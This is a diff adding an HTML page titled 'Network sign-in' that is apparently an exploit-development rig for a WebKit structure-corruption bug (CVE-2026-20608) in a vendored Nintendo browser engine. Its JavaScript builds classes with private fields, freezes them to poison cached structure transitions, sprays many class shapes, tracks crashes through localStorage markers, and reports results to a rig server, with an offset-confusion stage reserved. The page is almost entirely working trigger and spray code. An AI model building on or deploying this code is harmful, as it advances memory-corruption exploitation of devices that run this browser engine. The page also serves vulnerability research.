@@ -1,0 +1,649 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained: pure JS, no assets, nothing leaves this page except
+     telemetry. Same dark card as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.done { background: #2e6b3a; }
+  #rig-state.hit { background: #7a2e35; }
+  #rig-state.failed { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>freeze/seal-on-private-fields structure oracle &mdash; BarbarismJB
+      webkit-rig freeze (CVE-2026-20608, phased; SAFE behavioral oracle by
+      default)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">phase gate</td><td class="v" id="rig-gate">asking rig&hellip;</td></tr>
+    <tr><td class="k">private fields / class syntax</td><td class="v" id="rig-syntax">pending</td></tr>
+    <tr><td class="k">phase 1 &mdash; behavior matrix</td><td class="v" id="rig-p1">pending</td></tr>
+    <tr><td class="k">phase 2 &mdash; structure spray</td><td class="v" id="rig-p2">pending</td></tr>
+    <tr><td class="k">phase 3 &mdash; offset confusion</td><td class="v" id="rig-p3">pending</td></tr>
+    <tr><td class="k">verdict</td><td class="v" id="rig-verdict">pending</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">Phase 1 measures ONLY observable behavior across
+      instances sharing structures (frozen-ness asymmetry, private-field
+      write consistency, exception text) &mdash; no crash is expected or
+      required for a signal. Phase 2 (structure-spray escalation) runs
+      ONLY after the bench operator advances the rig-side gate:
+      <tt>curl -X POST http://RIG/rig/phase -d '{"phase":2}'</tt> (local
+      only). A crash mid-run leaves an "armed" marker reported on the
+      next load. Page marker freeze (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the oracle.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig freeze page: CVE-2026-20608 structure-corruption
+ * oracle (freeze/seal on private fields).
+ *
+ * PROVENANCE -- the LIVE caller chain as verified in our own tree
+ * (vendor/nintendo-oss/.../webkit_3.12.11; docs/NDAYS-V2.md row 2,
+ * caller-chain check COMPLETE 2026-11-11; docs/NDAYS-C-TIER.md verdict 3):
+ *
+ *   ObjectConstructor.cpp:785-788  objectConstructorFreeze fast path:
+ *       jsDynamicCast<JSFinalObject*> && no indexed properties ->
+ *       object->freeze(vm) directly (the common shape for `class` instances)
+ *   JSObject.cpp:2616-2621         JSObject::freeze ->
+ *       Structure::freezeTransition(vm, structure)
+ *   Structure.cpp:844-853          nonPropertyTransitionSlow attribute
+ *       loop: for EVERY property-table entry, DontDelete |= and, for
+ *       freeze, ReadOnly |= on non-accessors -- with NO private-name
+ *       exclusion (the codebase's own isPrivateName() idiom exists at
+ *       :1367 but is not consulted here). Private fields ARE property-
+ *       table entries keyed by private symbols -> they get DontDelete +
+ *       ReadOnly OR'd on.
+ *   Structure.cpp:866-875          the corrupted structure is then
+ *       m_transitionTable.add()'ed -- CACHED AS A REUSABLE TRANSITION, so
+ *       later instances of the same shape can inherit the corruption.
+ *
+ * Pure interpreter path -- no JIT hop anywhere, exactly what a no-JIT
+ * console runs. Fix upstream (672cdd38781c, Mar 2026) excludes private
+ * names from the loop.
+ *
+ * PHASES (config constants in CFG):
+ *   1 (default, SAFE): behavioral oracle. Classes with private fields,
+ *     Object.freeze(this) in the constructor AND freeze-mid-method
+ *     variants; instance-order matrices (freeze-first / freeze-last /
+ *     interleaved, many instances sharing the base structure) exercising
+ *     get/set/#x-in/defineProperty/delete orderings. Reports ANY
+ *     observable attribute desync: frozen-ness asymmetry between
+ *     instances (the cached-transition symptom), private-field writes
+ *     succeeding/failing inconsistently across instances, unexpected
+ *     exception text. A crash is NOT expected; desync alone is signal.
+ *   2 (rig gate >= 2): structure-spray escalation. Many distinct class
+ *     shapes (unique field counts/orders via new Function factories),
+ *     freeze-mid-method variants, and transition-table reuse patterns
+ *     (add/remove property chains before freezing so the corrupted
+ *     transition is the one new instances reuse). Armed-marker per
+ *     round, progress telemetry, crash-suffix oracle.
+ *   3 (rig gate >= 3): reserved stub (property-offset confusion probes --
+ *     not built until phase 2 maps on-device behavior).
+ *
+ * The gate: GET /rig/phase; ?phase=N can only LOWER the effective phase.
+ *
+ * ES5 host syntax except the class bodies, which live inside new
+ * Function() strings exactly like the rig's older stage-C control.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "freeze";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+
+/* ------------------------------------------------- config constants */
+var CFG = {
+  P1_INSTANCES: 48,               /* instances per order-matrix run       */
+  P1_ORDERS: ["freeze-first", "freeze-last", "interleaved"],
+  P1_FIELD_COUNTS: [1, 2, 4, 8],  /* private-field counts per test class   */
+  P2_CLASSES: 24,                 /* distinct sprayed class shapes        */
+  P2_FIELDS_MAX: 8,               /* max private fields per sprayed class */
+  P2_INSTANCES: 8,                /* instances per sprayed class          */
+  P2_ROUNDS: 3,                   /* spray rounds                         */
+  SETTLE_MS: 30
+};
+
+var R = {
+  schema: RIG_SCHEMA,
+  page: "freeze",
+  phase: "boot",
+  seq: 0,
+  startedAt: (new Date()).toISOString(),
+  stage: "boot",
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  gate: { rigPhase: null, requestedPhase: null, effectivePhase: null,
+          priorCrash: false },
+  syntax: null,
+  p1: { runs: [], verdict: null },
+  p2: { rounds: [], verdict: null },
+  p3: null,
+  verdict: null,
+  cfg: { instances: CFG.P1_INSTANCES, orders: CFG.P1_ORDERS.slice(),
+         fieldCounts: CFG.P1_FIELD_COUNTS.slice(),
+         p2Classes: CFG.P2_CLASSES, p2Rounds: CFG.P2_ROUNDS },
+  errors: []
+};
+
+function fail(stage, e) {
+  if (R.errors.length < 20) {
+    R.errors.push({ stage: stage, error: String(e && e.message ? e.message : e) });
+  }
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function r3(x) { return Math.round(x * 1000) / 1000; }
+function probe(stage, fn) {
+  try { return fn(); } catch (e) { fail(stage, e); return null; }
+}
+
+/* ------------------------------------------------------- transport */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { fail("post.stringify", e); cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { viaXhr(url, payload, cb); });
+    return;
+  }
+  viaXhr(url, payload, cb);
+}
+function viaXhr(url, payload, cb) {
+  if (typeof XMLHttpRequest === "undefined") { cb(false); return; }
+  var done = false;
+  function finish(ok) { if (!done) { done = true; cb(ok); } }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.timeout = 5000;
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) { finish(xhr.status >= 200 && xhr.status < 300); }
+    };
+    xhr.onerror = function () { finish(false); };
+    xhr.ontimeout = function () { finish(false); };
+    xhr.send(payload);
+  } catch (e) { fail("post.xhr", e); finish(false); }
+}
+var BACKOFF_MS = [250, 500, 1000, 2000, 4000, 8000];
+function postReport(phase, cb) {
+  var attempts = 0;
+  function attempt() {
+    attempts++;
+    R.phase = phase;
+    R.seq++;
+    sendJson(RIG_BASE + "/report", R, function (ok) {
+      if (ok) { cb(true, attempts); return; }
+      if (attempts <= BACKOFF_MS.length) {
+        setRow("rig-post", "retry " + attempts + " in " + BACKOFF_MS[attempts - 1] + "ms");
+        setTimeout(attempt, BACKOFF_MS[attempts - 1]);
+      } else { cb(false, attempts); }
+    });
+  }
+  attempt();
+}
+function getJson(url, cb, timeoutMs) {
+  var settled = false;
+  var to = setTimeout(function () {
+    if (!settled) { settled = true; cb(null, "timeout"); }
+  }, timeoutMs || 4000);
+  if (typeof fetch === "function") {
+    fetch(url)
+      .then(function (res) { return res.json(); })
+      .then(function (j) {
+        if (!settled) { settled = true; clearTimeout(to); cb(j, null); }
+      })
+      .catch(function (e) {
+        if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); }
+      });
+    return;
+  }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.timeout = timeoutMs || 4000;
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && !settled) {
+        settled = true; clearTimeout(to);
+        if (xhr.status >= 200 && xhr.status < 300) {
+          try { cb(JSON.parse(xhr.responseText), null); }
+          catch (e) { cb(null, "bad json"); }
+        } else { cb(null, "HTTP " + xhr.status); }
+      }
+    };
+    xhr.onerror = function () {
+      if (!settled) { settled = true; clearTimeout(to); cb(null, "xhr.error"); }
+    };
+    xhr.send();
+  } catch (e) { if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); } }
+}
+
+/* ------------------------------------------------- crash-oracle marker */
+var MARKER_KEY = "freeze:last-run";
+function armMarker(tag) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "armed", tag: tag,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function disarmMarker(tag, verdict) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "done", tag: tag,
+                                                     verdict: verdict,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function checkPriorCrash() {
+  try {
+    var raw = localStorage.getItem(MARKER_KEY);
+    if (!raw) { return null; }
+    var m = JSON.parse(raw);
+    return m && m.state === "armed" ? m : null;
+  } catch (e) { return null; }
+}
+
+/* ------------------------------------------------------ test classes */
+/* class factories: N private fields + a public prop + accessors; the
+ * freezeInCtor flag decides where Object.freeze(this) runs. The class
+ * source is built as a string so phase 2 can spray distinct shapes. */
+function makeClassSrc(nFields, freezeInCtor, freezeMidMethod) {
+  /* private names must be identifiers: #f0, #f1, ... (a bare #0 is a
+   * syntax error, which is exactly what the first browser run caught) */
+  var fields = "", inits = "", writes = "", cases = "";
+  var i;
+  for (i = 0; i < nFields; i++) {
+    fields += "#f" + i + ";";
+    inits += "this.#f" + i + " = " + (i + 1) + ";";
+    writes += "this.#f" + i + " = this.#f" + i + " + 1;";
+    cases += "case " + i + ": return this.#f" + i + ";";
+  }
+  var freeze = freezeInCtor ? "Object.freeze(this);" : "";
+  var mid = freezeMidMethod
+      ? "if (!this.__froze) { this.__froze = true; Object.freeze(this); }" : "";
+  return "'use strict';\n" +
+    "return class T {\n" +
+    "  " + fields + "\n" +
+    "  pub = 10;\n" +
+    "  __froze = false;\n" +
+    "  constructor() {\n" +
+    "    " + inits + "\n" +
+    "    " + freeze + "\n" +
+    "  }\n" +
+    "  writePrivates() { " + mid + " " + writes + " return this.#f0; }\n" +
+    "  readPrivate(i) { switch (i) { " + cases + " } return null; }\n" +
+    "  has0() { try { return #f0 in this; } catch (e) { return 'threw'; } }\n" +
+    "};\n";
+}
+function buildClass(nFields, freezeInCtor, freezeMidMethod) {
+  var f = new Function(makeClassSrc(nFields, freezeInCtor, freezeMidMethod));
+  return f();
+}
+
+/* ------------------------------------------- per-instance observation */
+function observeInstance(inst, expectFrozen, tag) {
+  /* everything guarded: the ORACLE is the recorded observation, whatever
+   * it is; expected* is the spec-correct value for the bench to diff */
+  var o = { tag: tag, expectFrozen: expectFrozen };
+  function t(label, fn) {
+    try { o[label] = fn(); } catch (e) {
+      o[label] = "threw:" + String(e && e.name ? e.name : "?") + ":" +
+                 String(e && e.message ? e.message : e).slice(0, 120);
+    }
+  }
+  t("isFrozen", function () { return Object.isFrozen(inst); });
+  t("isSealed", function () { return Object.isSealed(inst); });
+  t("isExtensible", function () { return Object.isExtensible(inst); });
+  t("readPriv0", function () { return inst.readPrivate(0); });
+  t("writePrivate", function () { return inst.writePrivates(); });
+  t("hasPriv0", function () { return inst.has0(); });
+  t("writePub", function () { inst.pub = 99; return inst.pub; });
+  t("deletePub", function () { return delete inst.pub; });
+  t("definePub", function () {
+    Object.defineProperty(inst, "added", { value: 1, writable: true,
+                                           configurable: true });
+    return "ok";
+  });
+  o.desync = [];
+  if (o.isFrozen !== expectFrozen) {
+    o.desync.push("isFrozen=" + o.isFrozen + " expected " + expectFrozen);
+  }
+  /* writePub semantics are mode-agnostic: the write must NOT take effect
+   * on a frozen instance (strict throw or sloppy silent no-op -- the
+   * returned value must still be the original 10) and MUST take effect
+   * (99) on an unfrozen one. A write landing on a frozen instance, or
+   * blocked on an unfrozen one, is attribute desync in either direction
+   * -- the cached-corrupted-transition symptom. */
+  var wp = o.writePub;
+  var blocked = (wp === 10) || String(wp).indexOf("threw:") === 0;
+  if (expectFrozen && wp === 99) {
+    o.desync.push("writePub took effect on frozen instance");
+  }
+  if (!expectFrozen && blocked) {
+    o.desync.push("writePub blocked on UNFROZEN instance (" +
+                  JSON.stringify(wp) + ")");
+  }
+  return o;
+}
+
+/* ------------------------------------------------------ phase 1 */
+function phase1(cb) {
+  var runs = [];
+  var idx = 0;
+  var combos = [];
+  var i, j;
+  for (i = 0; i < CFG.P1_FIELD_COUNTS.length; i++) {
+    for (j = 0; j < CFG.P1_ORDERS.length; j++) {
+      combos.push({ fields: CFG.P1_FIELD_COUNTS[i], order: CFG.P1_ORDERS[j] });
+    }
+  }
+  function nextCombo() {
+    if (idx >= combos.length) {
+      var desyncs = 0, k;
+      for (k = 0; k < runs.length; k++) {
+        desyncs += runs[k].desyncCount;
+      }
+      R.p1.runs = runs;
+      R.p1.verdict = desyncs === 0 ? "CONSISTENT-FROZEN"
+          : "DESYNC(" + desyncs + ")";
+      setRow("rig-p1", R.p1.verdict + " (" + runs.length + " runs, " +
+             CFG.P1_INSTANCES + " inst/run)");
+      cb(desyncs === 0);
+      return;
+    }
+    var combo = combos[idx];
+    probe("p1." + combo.fields + "f." + combo.order, function () {
+      var run = { fields: combo.fields, order: combo.order,
+                  instances: [], desyncCount: 0 };
+      var Klass = buildClass(combo.fields, true, false);
+      var KlassPlain = buildClass(combo.fields, false, false);
+      var t0 = nowMs();
+      var n = CFG.P1_INSTANCES, m;
+      for (m = 0; m < n; m++) {
+        var frozenAt = (combo.order === "freeze-first") ? (m < n / 2)
+            : (combo.order === "freeze-last") ? (m >= n / 2)
+            : (m % 2 === 0);
+        var C = frozenAt ? Klass : KlassPlain;
+        var inst;
+        try { inst = new C(); }
+        catch (e) {
+          run.instances.push({ constructThrew:
+                               String(e && e.message ? e.message : e) });
+          run.desyncCount++;
+          continue;
+        }
+        var obs = observeInstance(inst, frozenAt,
+                                  combo.order + "#" + m);
+        if (obs.desync.length) { run.desyncCount++; }
+        run.instances.push(obs);
+      }
+      run.ms = r3(nowMs() - t0);
+      runs.push(run);
+      setRow("rig-p1", combo.fields + "f/" + combo.order + ": " +
+             (run.desyncCount ? run.desyncCount + " desync" : "clean") +
+             " " + run.ms + "ms");
+    });
+    idx++;
+    setTimeout(nextCombo, CFG.SETTLE_MS);
+  }
+  nextCombo();
+}
+
+/* ------------------------------------------------------ phase 2 */
+function phase2(cb) {
+  var rounds = [];
+  var rIdx = 0;
+  function nextRound() {
+    if (rIdx >= CFG.P2_ROUNDS) {
+      var total = 0, k;
+      for (k = 0; k < rounds.length; k++) { total += rounds[k].desyncCount; }
+      R.p2.rounds = rounds;
+      R.p2.verdict = total === 0 ? "SPRAY-CLEAN" : "SPRAY-DESYNC(" + total + ")";
+      setRow("rig-p2", R.p2.verdict);
+      disarmMarker("p2", R.p2.verdict);
+      cb(total > 0);
+      return;
+    }
+    var tag = "p2:r" + rIdx;
+    armMarker(tag);
+    probe("p2.round" + rIdx, function () {
+      var round = { round: rIdx, classes: [], desyncCount: 0 };
+      var t0 = nowMs();
+      var c;
+      for (c = 0; c < CFG.P2_CLASSES; c++) {
+        var nFields = 1 + ((c * 7 + rIdx * 3) % CFG.P2_FIELDS_MAX);
+        var freezeMid = (c % 2) === 0;
+        var Klass = buildClass(nFields, false, freezeMid);
+        var rec = { classIdx: c, fields: nFields, freezeMid: freezeMid,
+                    instances: 0, desync: 0 };
+        var m;
+        for (m = 0; m < CFG.P2_INSTANCES; m++) {
+          var inst;
+          try { inst = new Klass(); }
+          catch (e) {
+            rec.constructThrew = String(e && e.message ? e.message : e).slice(0, 120);
+            rec.desync++;
+            continue;
+          }
+          /* first writePrivates() call performs the mid-method freeze;
+           * the frozen structure is now the cached transition -- the
+           * NEXT instances reuse it (the 20608 cache path) */
+          var obs = observeInstance(inst, false, "spray#" + c + "-" + m);
+          if (obs.desync.length) { rec.desync++; }
+          rec.instances++;
+        }
+        /* transition-table reuse pattern: churn public properties to
+         * lengthen the transition chain, then freeze, then build more */
+        try {
+          var churner = new Klass();
+          for (m = 0; m < 6; m++) { churner["p" + m] = m; }
+          Object.freeze(churner);
+          for (m = 0; m < 4; m++) {
+            var late = new Klass();
+            var obs2 = observeInstance(late, false, "late#" + c + "-" + m);
+            if (obs2.desync.length) { rec.desync++; }
+          }
+          rec.instances += 4;
+        } catch (e) {
+          rec.churnThrew = String(e && e.message ? e.message : e).slice(0, 120);
+        }
+        round.classes.push(rec);
+        if (rec.desync) { round.desyncCount += rec.desync; }
+      }
+      round.ms = r3(nowMs() - t0);
+      rounds.push(round);
+      setRow("rig-p2", "round " + (rIdx + 1) + "/" + CFG.P2_ROUNDS + ": " +
+             round.desyncCount + " desync, " + round.ms + "ms");
+    });
+    rIdx++;
+    /* mid-phase telemetry: a crash in a later round still leaves the
+     * earlier rounds on the bench */
+    postReport("progress", function () {});
+    setTimeout(nextRound, CFG.SETTLE_MS);
+  }
+  nextRound();
+}
+
+/* ------------------------------------------------------ phase 3 */
+function phase3(cb) {
+  R.p3 = { attempted: true, verdict: "RESERVED",
+           note: "property-offset confusion probes built only after " +
+                 "phase 2 maps on-device behavior" };
+  setRow("rig-p3", "reserved (gate is on; probes not yet built)");
+  disarmMarker("p3", "RESERVED");
+  cb();
+}
+
+/* ------------------------------------------------------------ verdict */
+function computeVerdict() {
+  if (R.gate.priorCrash) { return "PRIOR-RUN-CRASHED"; }
+  if (R.p2.verdict && R.p2.verdict.indexOf("DESYNC") !== -1) {
+    return R.p2.verdict;
+  }
+  if (R.p1.verdict === "DESYNC") { return "P1-DESYNC"; }
+  if (R.p2.verdict === "SPRAY-CLEAN") { return "SPRAY-CLEAN"; }
+  return R.p1.verdict || "UNKNOWN";
+}
+
+/* ------------------------------------------------------------ driver */
+function gateRow() {
+  return "rig=" + (R.gate.rigPhase == null ? "?" : R.gate.rigPhase) +
+         " want=" + (R.gate.requestedPhase == null ? "?" : R.gate.requestedPhase) +
+         " effective=" + R.gate.effectivePhase;
+}
+function probeSyntax() {
+  var s = {};
+  s.privateFields = probe("syntax.priv", function () {
+    try {
+      var C = new Function("return class { #x = 1; read() { return this.#x; } };")();
+      return new C().read() === 1;
+    } catch (e) { return false; }
+  });
+  s.classFields = probe("syntax.fields", function () {
+    try {
+      var C = new Function("return class { pub = 7; };")();
+      return new C().pub === 7;
+    } catch (e) { return false; }
+  });
+  s.freeze = typeof Object.freeze === "function";
+  s.isFrozen = typeof Object.isFrozen === "function";
+  R.syntax = s;
+  setRow("rig-syntax", "privateFields=" + s.privateFields +
+         " classFields=" + s.classFields +
+         " freeze=" + s.freeze);
+  return s.privateFields === true && s.freeze;
+}
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+
+  var prior = checkPriorCrash();
+  if (prior) {
+    R.gate.priorCrash = true;
+    R.gate.priorCrashMarker = prior;
+    setRow("rig-verdict", "PRIOR RUN LEFT ARMED MARKER (crash oracle: " +
+           (prior.tag || "?") + " at " + (prior.ts || "?") + ")");
+  }
+
+  var want = 1;
+  try {
+    var mWant = location.search.match(/[?&]phase=(\d+)/);
+    if (mWant) { want = Math.max(1, Math.min(3, parseInt(mWant[1], 10))); }
+  } catch (e) {}
+  R.gate.requestedPhase = want;
+  getJson(RIG_BASE + "/rig/phase", function (j, err) {
+    if (j && typeof j.phase === "number") {
+      R.gate.rigPhase = j.phase;
+    } else {
+      R.gate.rigPhase = 1;                    /* unreachable gate == safe */
+      R.gate.gateError = err || "unparsable";
+    }
+    R.gate.effectivePhase = Math.min(R.gate.rigPhase, want);
+    setRow("rig-gate", gateRow());
+
+    var supported = probeSyntax();
+    postReport("env", function (ok, att) {
+      setRow("rig-post", ok ? "sent (env, " + att + " attempt(s))"
+                            : "env POST failed after " + att);
+    });
+    if (!supported) {
+      R.p1.verdict = "UNSUPPORTED";
+      setRow("rig-p1", "unsupported (no private fields or freeze)");
+      return finish();
+    }
+
+    phase1(function () {
+      if (R.gate.effectivePhase < 2) { return finish(); }
+      phase2(function () {
+        if (R.gate.effectivePhase < 3) { return finish(); }
+        phase3(function () { finish(); });
+      });
+    });
+  });
+
+  /* watchdog: whatever wedges, the page must still POST a partial result */
+  setTimeout(function () {
+    if (R.stage === "done") { return; }
+    fail("watchdog", "budget exceeded in stage " + R.stage);
+    finish();
+  }, 30000);
+
+  function finish() {
+    if (R.stage === "done") { return; }
+    R.stage = "done";
+    R.verdict = computeVerdict();
+    setRow("rig-verdict", R.verdict);
+    setState(R.verdict.indexOf("DESYNC") !== -1 ||
+             R.verdict.indexOf("CRASHED") !== -1 ? "HIT" : "DONE",
+             R.verdict.indexOf("DESYNC") !== -1 ||
+             R.verdict.indexOf("CRASHED") !== -1 ? "hit" : "done");
+    postReport("verdict", function (ok, att) {
+      setRow("rig-post", ok ? "sent (verdict, " + att + " attempt(s))"
+                            : "FAILED after " + att + " attempts");
+    });
+  }
+}
+
+/* expose for wsagent-driven repetition */
+window.__freeze = window.__freeze || {};
+window.__freeze.cfg = CFG;
+window.__freeze.buildClass = buildClass;
+window.__freeze.observeInstance = observeInstance;
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  R.stage = "CRASHED@" + (R.stage || "driver");
+  setState("ORACLE CRASHED", "failed");
+  setRow("rig-verdict", R.stage);
+  try { postReport("crash", function () {}); } catch (e2) {}
+}
+</script>
+</body>
+</html>
